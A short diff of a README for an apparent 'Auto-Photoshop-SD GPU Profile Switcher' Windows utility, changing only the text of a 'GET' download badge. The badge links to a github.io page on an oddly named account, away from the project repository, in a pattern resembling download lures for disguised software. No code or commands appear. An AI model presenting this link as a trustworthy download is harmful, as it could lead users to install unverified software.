@@ -1,6 +1,6 @@
 # Auto-Photoshop-SD GPU Profile Switcher - Windows Graphics Profile Utility
 
-[![GET Auto-Photoshop-SD GPU Profile Switcher](https://img.shields.io/badge/GET%20%E2%80%94%20Auto-Photoshop-SD%20GPU%20Profile%20Switcher-0078D6?style=for-the-badge&logoColor=white)](https://siioettepervia.github.io/.github/Auto-Photoshop-SD)
+[![GET Auto-Photoshop-SD GPU Profile Switcher](https://img.shields.io/badge/GET%20%E2%80%94%20Auto_Photoshop_SD%20GPU%20Profile%20Switcher-0078D6?style=for-the-badge&logoColor=white)](https://siioettepervia.github.io/.github/Auto-Photoshop-SD)
 
 ---
 
